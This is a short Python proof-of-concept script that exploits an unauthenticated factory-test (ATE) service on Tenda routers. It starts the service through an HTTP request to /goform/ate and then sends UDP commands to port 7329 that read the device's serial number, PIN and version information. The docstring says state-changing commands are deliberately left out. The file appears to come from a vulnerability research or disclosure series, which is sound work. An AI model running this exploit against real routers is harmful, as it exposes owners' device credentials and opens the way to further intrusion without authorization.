#!/usr/bin/env python3
"""02 — unauthenticated ATE service (READ-ONLY subset).
usage: ./02_ate_service.py <router-ip>
Starts the daemon via /goform/ate and reads factory values over UDP 7329.
No changing command is sent (Tenda_mfg default / reboot / nvram set are deliberately NOT used)."""
import socket, sys, urllib.request
ip = sys.argv[1] if len(sys.argv) > 1 else "192.168.0.1"
print("[1] start service:", urllib.request.urlopen(f"http://{ip}/goform/ate", timeout=5).read()[:60])
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(3)
for cmd in (b"Tenda_mfg htmlVersionInfo", b"nvram get sn", b"nvram get pin", b"Tenda_mfg check"):
    s.sendto(cmd, (ip, 7329))
    try: print(f"[2] {cmd.decode():26s} -> {s.recvfrom(4096)[0][:120]!r}")
    except Exception as e: print(f"[2] {cmd.decode():26s} -> no reply ({e})")
